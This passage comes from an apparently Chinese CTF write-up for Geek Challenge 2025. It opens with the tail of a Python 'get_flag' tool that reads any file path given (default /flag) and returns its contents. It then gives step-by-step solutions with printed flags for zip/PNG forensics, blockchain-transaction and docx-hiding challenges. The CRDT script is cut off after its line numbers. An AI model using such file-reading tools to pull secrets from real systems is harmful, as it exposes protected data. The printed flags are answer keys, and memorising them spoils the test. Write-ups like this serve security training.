</span></span><span class="line"><span class="cl">                <span class="s2">&#34;description&#34;</span><span class="p">:</span> <span class="s2">&#34;flag文件路径，默认为/flag&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;required&#34;</span><span class="p">:</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">get_flag</span><span class="p">(</span><span class="n">arguments</span><span class="p">:</span> <span class="nb">dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">Any</span><span class="p">],</span> <span class="n">context</span><span class="p">:</span> <span class="n">ToolExecutionContext</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">ToolResult</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">file_path</span> <span class="o">=</span> <span class="n">arguments</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;file_path&#39;</span><span class="p">,</span> <span class="s1">&#39;/flag&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flag_content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">content</span> <span class="o">=</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="sa">f</span><span class="s2">&#34;Flag内容: </span><span class="si">{</span><span class="n">flag_content</span><span class="si">}</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="sa">f</span><span class="s2">&#34;session_id=</span><span class="si">{</span><span class="n">context</span><span class="o">.</span><span class="n">session_id</span><span class="si">}</span><span class="s2">, invocation_id=</span><span class="si">{</span><span class="n">context</span><span class="o">.</span><span class="n">invocation_id</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">ToolResult</span><span class="p">(</span><span class="n">content</span><span class="o">=</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">FileNotFoundError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">tool</span> <span class="o">=</span> <span class="n">get_flag</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="bite-off-picture">Bite off picture
</h3><h4 id="解题流程-19">解题流程
</h4><p>得到一个.zip文件，使用010打开并加载zip模板，从文件结尾读到了额外的数据</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">==gcyV2dyV2d
</span></span></code></pre></td></tr></table>
</div>
</div><p>倒置后解Base64编码得到</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">werwerr
</span></span></code></pre></td></tr></table>
</div>
</div><p>使用它解压zip，得到一张图片wow.png，但并不包含flag
使用010再打开图片，修改图片大小
<img src="/p/geek-challenge-2025-wp/image-20.png"
	width="1449"
	height="694"
	srcset="/p/geek-challenge-2025-wp/image-20_hu_4cf098e9f670800d.png 480w, /p/geek-challenge-2025-wp/image-20_hu_6271a5c0dd947fb7.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="208"
		data-flex-basis="501px"
	
>
再次打开图片发现flag
<img src="/p/geek-challenge-2025-wp/image-21.png"
	width="942"
	height="898"
	srcset="/p/geek-challenge-2025-wp/image-21_hu_9c85e09cedee2603.png 480w, /p/geek-challenge-2025-wp/image-21_hu_4f13319ae7bbc9be.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="104"
		data-flex-basis="251px"
	
></p>
<h4 id="flag-12">flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SYC{mi3c_13_really_fun!!!!!}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="blockchain-signin">Blockchain SignIn
</h3><h4 id="解题流程-20">解题流程
</h4><p>直接打开</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x208e0465ea757073d0ec6af9094e5404ef81a213970eb580fa6a28a3af4669d6
</span></span></code></pre></td></tr></table>
</div>
</div><p>的交易
从输入数据处得到</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x5359437b773362335f67346d335f73743472747d
</span></span></code></pre></td></tr></table>
</div>
</div><p>直接用Cyberchef from hex解</p>
<h4 id="flag-13">flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SYC{w3b3_g4m3_st4rt}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="hidden">hidden
</h3><h4 id="解题流程-21">解题流程
</h4><p>拿到docx文件，直接解压,从word/document.xml得到
<img src="/p/geek-challenge-2025-wp/image-22.png"
	width="500"
	height="270"
	srcset="/p/geek-challenge-2025-wp/image-22_hu_7ae409db7ad5dfd7.png 480w, /p/geek-challenge-2025-wp/image-22_hu_e9689a8a14300e4a.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="185"
		data-flex-basis="444px"
	
>
从doc/word.txt得到</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag2：MzYyZ2V5ZGd3dW5rZHdlZQ==
</span></span></code></pre></td></tr></table>
</div>
</div><p>解Base64得到</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">362geydgwunkdwee
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后一张图片无法打开，使用010检查，发现文件头损坏，补上即可
<img src="/p/geek-challenge-2025-wp/image-23.png"
	width="1467"
	height="1069"
	srcset="/p/geek-challenge-2025-wp/image-23_hu_21ae0117b460b117.png 480w, /p/geek-challenge-2025-wp/image-23_hu_52730d99fe52349a.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="137"
		data-flex-basis="329px"
	
>
得到
<img src="/p/geek-challenge-2025-wp/image-24.png"
	width="951"
	height="937"
	srcset="/p/geek-challenge-2025-wp/image-24_hu_ae1de74a107681a3.png 480w, /p/geek-challenge-2025-wp/image-24_hu_ad83d387308bd932.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="101"
		data-flex-basis="243px"
	
></p>
<h4 id="flag-14">flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SYC{adasd362geydgwunkdweesjdmd}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="crdt">CRDT
</h3><h4 id="解题流程-22">解题流程
</h4><p>下载得到一份CRDT记录，直接按照顺序操作一一遍就行，
但直接徒手操作太不健康了，所以选择使用py辅助</p>
<h4 id="exp-21">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">   1
</span><span class="lnt">   2
</span><span class="lnt">   3
</span><span class="lnt">   4
</span><span class="lnt">   5
</span><span class="lnt">   6
</span><span class="lnt">   7
</span><span class="lnt">   8
</span><span class="lnt">   9
</span><span class="lnt">  10
</span><span class="lnt">  11
</span><span class="lnt">  12
</span><span class="lnt">  13
</span><span class="lnt">  14
</span><span class="lnt">  15
</span><span class="lnt">  16
</span><span class="lnt">  17
</span><span class="lnt">  18
</span><span class="lnt">  19
</span><span class="lnt">  20
</span><span class="lnt">  21
</span><span class="lnt">  22
</span><span class="lnt">  23
</span><span class="lnt">  24
</span><span class="lnt">  25
</span><span class="lnt">  26
</span><span class="lnt">  27
</span><span class="lnt">  28
</span><span class="lnt">  29
</span><span class="lnt">  30
</span><span class="lnt">  31
</span><span class="lnt">  32
</span><span class="lnt">  33
</span><span class="lnt">  34
</span><span class="lnt">  35
</span><span class="lnt">  36
</span><span class="lnt">  37
</span><span class="lnt">  38
</span><span class="lnt">  39
</span><span class="lnt">  40
</span><span class="lnt">  41
</span><span class="lnt">  42
</span><span class="lnt">  43
</span><span class="lnt">  44
</span><span class="lnt">  45
</span><span class="lnt">  46
</span><span class="lnt">  47
</span><span class="lnt">  48
</span><span class="lnt">  49
</span><span class="lnt">  50
</span><span class="lnt">  51
</span><span class="lnt">  52
</span><span class="lnt">  53
</span><span class="lnt">  54
</span><span class="lnt">  55
</span><span class="lnt">  56
</span><span class="lnt">  57
</span><span class="lnt">  58
</span><span class="lnt">  59
</span><span class="lnt">  60
</span><span class="lnt">  61
</span><span class="lnt">  62
</span><span class="lnt">  63
</span><span class="lnt">  64
</span><span class="lnt">  65
</span><span class="lnt">  66
</span><span class="lnt">  67
</span><span class="lnt">  68
</span><span class="lnt">  69
</span><span class="lnt">  70
</span><span class="lnt">  71
</span><span class="lnt">  72
</span><span class="lnt">  73
</span><span class="lnt">  74
</span><span class="lnt">  75
</span><span class="lnt">  76
</span><span class="lnt">  77
</span><span class="lnt">  78
</span><span class="lnt">  79
</span><span class="lnt">  80
</span><span class="lnt">  81
</span><span class="lnt">  82
</span><span class="lnt">  83
</span><span class="lnt">  84
</span><span class="lnt">  85
</span><span class="lnt">  86
</span><span class="lnt">  87
</span><span class="lnt">  88
</span><span class="lnt">  89
</span><span class="lnt">  90
</span><span class="lnt">  91
</span><span class="lnt">  92
</span><span class="lnt">  93
</span><span class="lnt">  94
</span><span class="lnt">  95
</span><span class="lnt">  96
</span><span class="lnt">  97
</span><span class="lnt">  98
</span><span class="lnt">  99
</span><span class="lnt"> 100
</span><span class="lnt"> 101
</span><span class="lnt"> 102
</span><span class="lnt"> 103
</span><span class="lnt"> 104
</span><span class="lnt"> 105
</span><span class="lnt"> 106
</span><span class="lnt"> 107
</span><span class="lnt"> 108
</span><span class="lnt"> 109
</span><span class="lnt"> 110
</span><span class="lnt"> 111
</span><span class="lnt"> 112
</span><span class="lnt"> 113
</span><span class="lnt"> 114
</span><span class="lnt"> 115
</span><span class="lnt"> 116
</span><span class="lnt"> 117
</span><span class="lnt"> 118
</span><span class="lnt"> 119
</span><span class="lnt"> 120
</span><span class="lnt"> 121
</span><span class="lnt"> 122
</span><span class="lnt"> 123
</span><span class="lnt"> 124
</span><span class="lnt"> 125
</span><span class="lnt"> 126
</span><span class="lnt"> 127
</span><span class="lnt"> 128
</span><span class="lnt"> 129
</span><span class="lnt"> 130
</span><span class="lnt"> 131
</span><span class="lnt"> 132
</span><span class="lnt"> 133
</span><span class="lnt"> 134
</span><span class="lnt"> 135
</span><span class="lnt"> 136
</span><span class="lnt"> 137
</span><span class="lnt"> 138
</span><span class="lnt"> 139
</span><span class="lnt"> 140
</span><span class="lnt"> 141
</span><span class="lnt"> 142
</span><span class="lnt"> 143
</span><span class="lnt"> 144
</span><span class="lnt"> 145
</span><span class="lnt"> 146
</span><span class="lnt"> 147
</span><span class="lnt"> 148
</span><span class="lnt"> 149
</span><span class="lnt"> 150
</span><span class="lnt"> 151
</span><span class="lnt"> 152
</span><span class="lnt"> 153
</span><span class="lnt"> 154
</span><span class="lnt"> 155
</span><span class="lnt"> 156
</span><span class="lnt"> 157
</span><span class="lnt"> 158
</span><span class="lnt"> 159
</span><span class="lnt"> 160
</span><span class="lnt"> 161
</span><span class="lnt"> 162
</span><span class="lnt"> 163
</span><span class="lnt"> 164
</span><span class="lnt"> 165
</span><span class="lnt"> 166
</span><span class="lnt"> 167
</span><span class="lnt"> 168
</span><span class="lnt"> 169
</span><span class="lnt"> 170
</span><span class="lnt"> 171
</span><span class="lnt"> 172
</span><span class="lnt"> 173
</span><span class="lnt"> 174
</span><span class="lnt"> 175
</span><span class="lnt"> 176
</span><span class="lnt"> 177
</span><span class="lnt"> 178
</span><span class="lnt"> 179
</span><span class="lnt"> 180
</span><span class="lnt"> 181
</span><span class="lnt"> 182
</span><span class="lnt"> 183
</span><span class="lnt"> 184
</span><span class="lnt"> 185
</span><span class="lnt"> 186
</span><span class="lnt"> 187
</span><span class="lnt"> 188
</span><span class="lnt"> 189
</span><span class="lnt"> 190
</span><span class="lnt"> 191
</span><span class="lnt"> 192
</span><span class="lnt"> 193
</span><span class="lnt"> 194
</span><span class="lnt"> 195
</span><span class="lnt"> 196
</span><span class="lnt"> 197
</span><span class="lnt"> 198
</span><span class="lnt"> 199
</span><span class="lnt"> 200
</span><span class="lnt"> 201
</span><span class="lnt"> 202
</span><span class="lnt"> 203
</span><span class="lnt"> 204
</span><span class="lnt"> 205
</span><span class="lnt"> 206
</span><span class="lnt"> 207
</span><span class="lnt"> 208
</span><span class="lnt"> 209
</span><span class="lnt"> 210
</span><span class="lnt"> 211
</span><span class="lnt"> 212
</span><span class="lnt"> 213
</span><span class="lnt"> 214
</span><span class="lnt"> 215
</span><span class="lnt"> 216
</span><span class="lnt"> 217
</span><span class="lnt"> 218
</span><span class="lnt"> 219
</span><span class="lnt"> 220
</span><span class="lnt"> 221
</span><span class="lnt"> 222
</span><span class="lnt"> 223
</span><span class="lnt"> 224
</span><span class="lnt"> 225
</span><span class="lnt"> 226
</span><span class="lnt"> 227
</span><span class="lnt"> 228
</span><span class="lnt"> 229
</span><span class="lnt"> 230
</span><span class="lnt"> 231
</span><span class="lnt"> 232
</span><span class="lnt"> 233
</span><span class="lnt"> 234
</span><span class="lnt"> 235
</span><span class="lnt"> 236
</span><span class="lnt"> 237
</span><span class="lnt"> 238
</span><span class="lnt"> 239
</span><span class="lnt"> 240
</span><span class="lnt"> 241
</span><span class="lnt"> 242
</span><span class="lnt"> 243
</span><span class="lnt"> 244
</span><span class="lnt"> 245
</span><span class="lnt"> 246
</span><span class="lnt"> 247
</span><span class="lnt"> 248
</span><span class="lnt"> 249
</span><span class="lnt"> 250
</span><span class="lnt"> 251
</span><span class="lnt"> 252
</span><span class="lnt"> 253
</span><span class="lnt"> 254
</span><span class="lnt"> 255
</span><span class="lnt"> 256
</span><span class="lnt"> 257
</span><span class="lnt"> 258
</span><span class="lnt"> 259
</span><span class="lnt"> 260
</span><span class="lnt"> 261
</span><span class="lnt"> 262
</span><span class="lnt"> 263
</span><span class="lnt"> 264
</span><span class="lnt"> 265
</span><span class="lnt"> 266
</span><span class="lnt"> 267
</span><span class="lnt"> 268
</span><span class="lnt"> 269
</span><span class="lnt"> 270
</span><span class="lnt"> 271
</span><span class="lnt"> 272
</span><span class="lnt"> 273
</span><span class="lnt"> 274
</span><span class="lnt"> 275
</span><span class="lnt"> 276
</span><span class="lnt"> 277
</span><span class="lnt"> 278
</span><span class="lnt"> 279
</span><span class="lnt"> 280
</span><span class="lnt"> 281
</span><span class="lnt"> 282
</span><span class="lnt"> 283
</span><span class="lnt"> 284
</span><span class="lnt"> 285
</span><span class="lnt"> 286
</span><span class="lnt"> 287
</span><span class="lnt"> 288
</span><span class="lnt"> 289
</span><span class="lnt"> 290
</span><span class="lnt"> 291
</span><span class="lnt"> 292
</span><span class="lnt"> 293
</span><span class="lnt"> 294
</span><span class="lnt"> 295
</span><span class="lnt"> 296
</span><span class="lnt"> 297
</span><span class="lnt"> 298
</span><span class="lnt"> 299
</span><span class="lnt"> 300
</span><span class="lnt"> 301
</span><span class="lnt"> 302
</span><span class="lnt"> 303
</span><span class="lnt"> 304
</span><span class="lnt"> 305
</span><span class="lnt"> 306
</span><span class="lnt"> 307
</span><span class="lnt"> 308
</span><span class="lnt"> 309
</span><span class="lnt"> 310
</span><span class="lnt"> 311
</span><span class="lnt"> 312
</span><span class="lnt"> 313
</span><span class="lnt"> 314
</span><span class="lnt"> 315
</span><span class="lnt"> 316
</span><span class="lnt"> 317
</span><span class="lnt"> 318
</span><span class="lnt"> 319
</span><span class="lnt"> 320
</span><span class="lnt"> 321
</span><span class="lnt"> 322
</span><span class="lnt"> 323
</span><span class="lnt"> 324
</span><span class="lnt"> 325
</span><span class="lnt"> 326
</span><span class="lnt"> 327
</span><span class="lnt"> 328
</span><span class="lnt"> 329
</span><span class="lnt"> 330
</span><span class="lnt"> 331
</span><span class="lnt"> 332
</span><span class="lnt"> 333
</span><span class="lnt"> 334
</span><span class="lnt"> 335
</span><span class="lnt"> 336
</span><span class="lnt"> 337
</span><span class="lnt"> 338
</span><span class="lnt"> 339
</span><span class="lnt"> 340
</span><span class="lnt"> 341
</span><span class="lnt"> 342
</span><span class="lnt"> 343
</span><span class="lnt"> 344
</span><span class="lnt"> 345
</span><span class="lnt"> 346
</span><span class="lnt"> 347
</span><span class="lnt"> 348
</span><span class="lnt"> 349
</span><span class="lnt"> 350
</span><span class="lnt"> 351
</span><span class="lnt"> 352
</span><span class="lnt"> 353
</span><span class="lnt"> 354
</span><span class="lnt"> 355
</span><span class="lnt"> 356
</span><span class="lnt"> 357
</span><span class="lnt"> 358
</span><span class="lnt"> 359
</span><span class="lnt"> 360
</span><span class="lnt"> 361
</span><span class="lnt"> 362
</span><span class="lnt"> 363
</span><span class="lnt"> 364
</span><span class="lnt"> 365
</span><span class="lnt"> 366
</span><span class="lnt"> 367
</span><span class="lnt"> 368
</span><span class="lnt"> 369
</span><span class="lnt"> 370
</span><span class="lnt"> 371
</span><span class="lnt"> 372
</span><span class="lnt"> 373
</span><span class="lnt"> 374
</span><span class="lnt"> 375
</span><span class="lnt"> 376
</span><span class="lnt"> 377
</span><span class="lnt"> 378
</span><span class="lnt"> 379
</span><span class="lnt"> 380
</span><span class="lnt"> 381
</span><span class="lnt"> 382
</span><span class="lnt"> 383
</span><span class="lnt"> 384
</span><span class="lnt"> 385
</span><span class="lnt"> 386
</span><span class="lnt"> 387
</span><span class="lnt"> 388
</span><span class="lnt"> 389
</span><span class="lnt"> 390
</span><span class="lnt"> 391
</span><span class="lnt"> 392
</span><span class="lnt"> 393
</span><span class="lnt"> 394
</span><span class="lnt"> 395
</span><span class="lnt"> 396
</span><span class="lnt"> 397
</span><span class="lnt"> 398
</span><span class="lnt"> 399
</span><span class="lnt"> 400
</span><span class="lnt"> 401
</span><span class="lnt"> 402
</span><span class="lnt"> 403
</span><span class="lnt"> 404
</span><span class="lnt"> 405
</span><span class="lnt"> 406
</span><span class="lnt"> 407
</span><span class="lnt"> 408
</span><span class="lnt"> 409
</span><span class="lnt"> 410
</span><span class="lnt"> 411
</span><span class="lnt"> 412
</span><span class="lnt"> 413
</span><span class="lnt"> 414
</span><span class="lnt"> 415
</span><span class="lnt"> 416
</span><span class="lnt"> 417
</span><span class="lnt"> 418
</span><span class="lnt"> 419
</span><span class="lnt"> 420
</span><span class="lnt"> 421
</span><span class="lnt"> 422
</span><span class="lnt"> 423
</span><span class="lnt"> 424
</span><span class="lnt"> 425
</span><span class="lnt"> 426
</span><span class="lnt"> 427
</span><span class="lnt"> 428
</span><span class="lnt"> 429
</span><span class="lnt"> 430
</span><span class="lnt"> 431
</span><span class="lnt"> 432
</span><span class="lnt"> 433
</span><span class="lnt"> 434
</span><span class="lnt"> 435
</span><span class="lnt"> 436
</span><span class="lnt"> 437
</span><span class="lnt"> 438
</span><span class="lnt"> 439
</span><span class="lnt"> 440
</span><span class="lnt"> 441
</span><span class="lnt"> 442
</span><span class="lnt"> 443
</span><span class="lnt"> 444
</span><span class="lnt"> 445
</span><span class="lnt"> 446
</span><span class="lnt"> 447
</span><span class="lnt"> 448
</span><span class="lnt"> 449
</span><span class="lnt"> 450
</span><span class="lnt"> 451
</span><span class="lnt"> 452
</span><span class="lnt"> 453
</span><span class="lnt"> 454
</span><span class="lnt"> 455
</span><span class="lnt"> 456
</span><span class="lnt"> 457
</span><span class="lnt"> 458
</span><span class="lnt"> 459
</span><span class="lnt"> 460
</span><span class="lnt"> 461
</span><span class="lnt"> 462
</span><span class="lnt"> 463
</span><span class="lnt"> 464
</span><span class="lnt"> 465
</span><span class="lnt"> 466
</span><span class="lnt"> 467
</span><span class="lnt"> 468
</span><span class="lnt"> 469
</span><span class="lnt"> 470
</span><span class="lnt"> 471
</span><span class="lnt"> 472
</span><span class="lnt"> 473
</span><span class="lnt"> 474
</span><span class="lnt"> 475
</span><span class="lnt"> 476
</span><span class="lnt"> 477
</span><span class="lnt"> 478
</span><span class="lnt"> 479
</span><span class="lnt"> 480
</span><span class="lnt"> 481
</span><span class="lnt"> 482
</span><span class="lnt"> 483
</span><span class="lnt"> 484
</span><span class="lnt"> 485
</span><span class="lnt"> 486
</span><span class="lnt"> 487
</span><span class="lnt"> 488
</span><span class="lnt"> 489
</span><span class="lnt"> 490
</span><span class="lnt"> 491
</span><span class="lnt"> 492
</span><span class="lnt"> 493
</span><span class="lnt"> 494
</span><span class="lnt"> 495
</span><span class="lnt"> 496
</span><span class="lnt"> 497
</span><span class="lnt"> 498
</span><span class="lnt"> 499
</span><span class="lnt"> 500
</span><span class="lnt"> 501
</span><span class="lnt"> 502
</span><span class="lnt"> 503
</span><span class="lnt"> 504
</span><span class="lnt"> 505
</span><span class="lnt"> 506
</span><span class="lnt"> 507
</span><span class="lnt"> 508
</span><span class="lnt"> 509
</span><span class="lnt"> 510
</span><span class="lnt"> 511
</span><span class="lnt"> 512
</span><span class="lnt"> 513
</span><span class="lnt"> 514
</span><span class="lnt"> 515
</span><span class="lnt"> 516
</span><span class="lnt"> 517
</span><span class="lnt"> 518
</span><span class="lnt"> 519
</span><span class="lnt"> 520
</span><span class="lnt"> 521
</span><span class="lnt"> 522
</span><span class="lnt"> 523
</span><span class="lnt"> 524
</span><span class="lnt"> 525
</span><span class="lnt"> 526
</span><span class="lnt"> 527
</span><span class="lnt"> 528
</span><span class="lnt"> 529
</span><span class="lnt"> 530
</span><span class="lnt"> 531
</span><span class="lnt"> 532
</span><span class="lnt"> 533
</span><span class="lnt"> 534
</span><span class="lnt"> 535
</span><span class="lnt"> 536
</span><span class="lnt"> 537
</span><span class="lnt"> 538
</span><span class="lnt"> 539
</span><span class="lnt"> 540
</span><span class="lnt"> 541
</span><span class="lnt"> 542
</span><span class="lnt"> 543
</span><span class="lnt"> 544
</span><span class="lnt"> 545
</span><span class="lnt"> 546
</span><span class="lnt"> 547
</span><span class="lnt"> 548
</span><span class="lnt"> 549
</span><span class="lnt"> 550
</span><span class="lnt"> 551
</span><span class="lnt"> 552
</span><span class="lnt"> 553
</span><span class="lnt"> 554
</span><span class="lnt"> 555
</span><span class="lnt"> 556
</span><span class="lnt"> 557
</span><span class="lnt"> 558
</span><span class="lnt"> 559
</span><span class="lnt"> 560
</span><span class="lnt"> 561
</span><span class="lnt"> 562
</span><span class="lnt"> 563
</span><span class="lnt"> 564
</span><span class="lnt"> 565
</span><span class="lnt"> 566
</span><span class="lnt"> 567
</span><span class="lnt"> 568
</span><span class="lnt"> 569
</span><span class="lnt"> 570
</span><span class="lnt"> 571
</span><span class="lnt"> 572
</span><span class="lnt"> 573
</span><span class="lnt"> 574
</span><span class="lnt"> 575
</span><span class="lnt"> 576
</span><span class="lnt"> 577
</span><span class="lnt"> 578
</span><span class="lnt"> 579
</span><span class="lnt"> 580
</span><span class="lnt"> 581
</span><span class="lnt"> 582
</span><span class="lnt"> 583
</span><span class="lnt"> 584
</span><span class="lnt"> 585
</span><span class="lnt"> 586
</span><span class="lnt"> 587
</span><span class="lnt"> 588
</span><span class="lnt"> 589
</span><span class="lnt"> 590
</span><span class="lnt"> 591
</span><span class="lnt"> 592
</span><span class="lnt"> 593
</span><span class="lnt"> 594
</span><span class="lnt"> 595
</span><span class="lnt"> 596
</span><span class="lnt"> 597
</span><span class="lnt"> 598
</span><span class="lnt"> 599
</span><span class="lnt"> 600
</span><span class="lnt"> 601
</span><span class="lnt"> 602
</span><span class="lnt"> 603
</span><span class="lnt"> 604
</span><span class="lnt"> 605
</span><span class="lnt"> 606
</span><span class="lnt"> 607
</span><span class="lnt"> 608
</span><span class="lnt"> 609
</span><span class="lnt"> 610
</span><span class="lnt"> 611
</span><span class="lnt"> 612
</span><span class="lnt"> 613
</span><span class="lnt"> 614
</span><span class="lnt"> 615
</span><span class="lnt"> 616
</span><span class="lnt"> 617
</span><span class="lnt"> 618
</span><span class="lnt"> 619
</span><span class="lnt"> 620
</span><span class="lnt"> 621
</span><span class="lnt"> 622
</span><span class="lnt"> 623
</span><span class="lnt"> 624
</span><span class="lnt"> 625
</span><span class="lnt"> 626
</span><span class="lnt"> 627
</span><span class="lnt"> 628
</span><span class="lnt"> 629
</span><span class="lnt"> 630
</span><span class="lnt"> 631
</span><span class="lnt"> 632
</span><span class="lnt"> 633
</span><span class="lnt"> 634
</span><span class="lnt"> 635
</span><span class="lnt"> 636
</span><span class="lnt"> 637
</span><span class="lnt"> 638
</span><span class="lnt"> 639
</span><span class="lnt"> 640
</span><span class="lnt"> 641
</span><span class="lnt"> 642
</span><span class="lnt"> 643
</span><span class="lnt"> 644
</span><span class="lnt"> 645
</span><span class="lnt"> 646
</span><span class="lnt"> 647
</span><span class="lnt"> 648
</span><span class="lnt"> 649
</span><span class="lnt"> 650
</span><span class="lnt"> 651
</span><span class="lnt"> 652
</span><span class="lnt"> 653
</span><span class="lnt"> 654
</span><span class="lnt"> 655
</span><span class="lnt"> 656
</span><span class="lnt"> 657
</span><span class="lnt"> 658
</span><span class="lnt"> 659
</span><span class="lnt"> 660
</span><span class="lnt"> 661
</span><span class="lnt"> 662
</span><span class="lnt"> 663
</span><span class="lnt"> 664
</span><span class="lnt"> 665
</span><span class="lnt"> 666
</span><span class="lnt"> 667
</span><span class="lnt"> 668
</span><span class="lnt"> 669
</span><span class="lnt"> 670
</span><span class="lnt"> 671
</span><span class="lnt"> 672
</span><span class="lnt"> 673
</span><span class="lnt"> 674
</span><span class="lnt"> 675
</span><span class="lnt"> 676
</span><span class="lnt"> 677
</span><span class="lnt"> 678
</span><span class="lnt"> 679
</span><span class="lnt"> 680
</span><span class="lnt"> 681
</span><span class="lnt"> 682
</span><span class="lnt"> 683
</span><span class="lnt"> 684
</span><span class="lnt"> 685
</span><span class="lnt"> 686
</span><span class="lnt"> 687
</span><span class="lnt"> 688
</span><span class="lnt"> 689
</span><span class="lnt"> 690
</span><span class="lnt"> 691
</span><span class="lnt"> 692
</span><span class="lnt"> 693
</span><span class="lnt"> 694
</span><span class="lnt"> 695
</span><span class="lnt"> 696
</span><span class="lnt"> 697
</span><span class="lnt"> 698
</span><span class="lnt"> 699
</span><span class="lnt"> 700
</span><span class="lnt"> 701
</span><span class="lnt"> 702
</span><span class="lnt"> 703
</span><span class="lnt"> 704
</span><span class="lnt"> 705
</span><span class="lnt"> 706
</span><span class="lnt"> 707
</span><span class="lnt"> 708
</span><span class="lnt"> 709
</span><span class="lnt"> 710
</span><span class="lnt"> 711
</span><span class="lnt"> 712
</span><span class="lnt"> 713
</span><span class="lnt"> 714
</span><span class="lnt"> 715
</span><span class="lnt"> 716
</span><span class="lnt"> 717
</span><span class="lnt"> 718
</span><span class="lnt"> 719
</span><span class="lnt"> 720
</span><span class="lnt"> 721
</span><span class="lnt"> 722
</span><span class="lnt"> 723
</span><span class="lnt"> 724
</span><span class="lnt"> 725
</span><span class="lnt"> 726
</span><span class="lnt"> 727
</span><span class="lnt"> 728
</span><span class="lnt"> 729
</span><span class="lnt"> 730
</span><span class="lnt"> 731
</span><span class="lnt"> 732
</span><span class="lnt"> 733
</span><span class="lnt"> 734
</span><span class="lnt"> 735
</span><span class="lnt"> 736
</span><span class="lnt"> 737
</span><span class="lnt"> 738
</span><span class="lnt"> 739
